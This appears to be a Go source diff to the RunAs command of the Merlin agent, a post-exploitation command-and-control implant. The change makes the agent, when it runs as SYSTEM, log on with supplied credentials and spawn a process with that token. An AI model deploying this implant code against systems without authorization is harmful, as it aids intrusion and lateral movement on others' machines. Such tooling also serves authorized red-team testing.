@@ -1,3 +1,4 @@
+//go:build windows
 // +build windows
 
 // Merlin is a post-exploitation command and control framework.
@@ -24,12 +25,16 @@ import (
 	"fmt"
 	"strings"
 
+	// X Packages
+	"golang.org/x/sys/windows"
+
 	// Merlin
 	"github.com/Ne0nd0g/merlin/pkg/jobs"
 
 	// Internal
 	"github.com/Ne0nd0g/merlin-agent/cli"
 	"github.com/Ne0nd0g/merlin-agent/os/windows/pkg/processes"
+	"github.com/Ne0nd0g/merlin-agent/os/windows/pkg/tokens"
 )
 
 // RunAs creates a new process as the provided user
@@ -48,6 +53,24 @@ func RunAs(cmd jobs.Command) (results jobs.Results) {
 	var arguments string
 	if len(cmd.Args) > 3 {
 		arguments = strings.Join(cmd.Args[3:], " ")
+	}
+
+	// Determine if running as SYSTEM
+	u, err := tokens.GetTokenUsername(windows.GetCurrentProcessToken())
+	if err != nil {
+		results.Stderr = err.Error()
+		return
+	}
+
+	// If we are running as SYSTEM, we can't call CreateProcess, must call LogonUserA -> CreateProcessAsUserA/CreateProcessWithTokenW
+	if u == "NT AUTHORITY\\SYSTEM" {
+		hToken, err2 := tokens.LogonUser(username, password, "", tokens.LOGON32_LOGON_INTERACTIVE, tokens.LOGON32_PROVIDER_DEFAULT)
+		if err2 != nil {
+			results.Stderr = err2.Error()
+			return
+		}
+		results.Stdout, results.Stderr = tokens.CreateProcessWithToken(hToken, application, strings.Split(arguments, " "))
+		return
 	}
 
 	results.Stdout, results.Stderr = processes.CreateProcessWithLogon(username, "", password, application, arguments, processes.LOGON_WITH_PROFILE, true)
